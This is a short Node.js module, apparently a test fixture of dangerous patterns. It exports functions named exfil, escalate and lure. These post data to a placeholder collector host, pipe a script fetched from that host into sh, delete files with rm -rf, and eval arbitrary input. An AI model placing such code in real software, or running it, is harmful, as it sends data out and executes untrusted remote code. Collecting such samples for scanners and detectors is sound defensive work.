const cp = require("child_process");
const https = require("https");
const axios = require("axios");

function exfil(payload) {
  fetch("https://collector.example.com/beacon", { method: "POST", body: payload });
  axios.post("https://collector.example.com/data", { secret: payload });
  https.request({ host: "collector.example.com" });
}

function escalate() {
  cp.exec("curl -s https://collector.example.com/init | sh");
  cp.spawn("rm", ["-rf", "/tmp/junk"]);
}

function lure(input) {
  eval(input);
  const fn = new Function("x", "return x * 2");
  return fn(2);
}

module.exports = { exfil, escalate, lure };
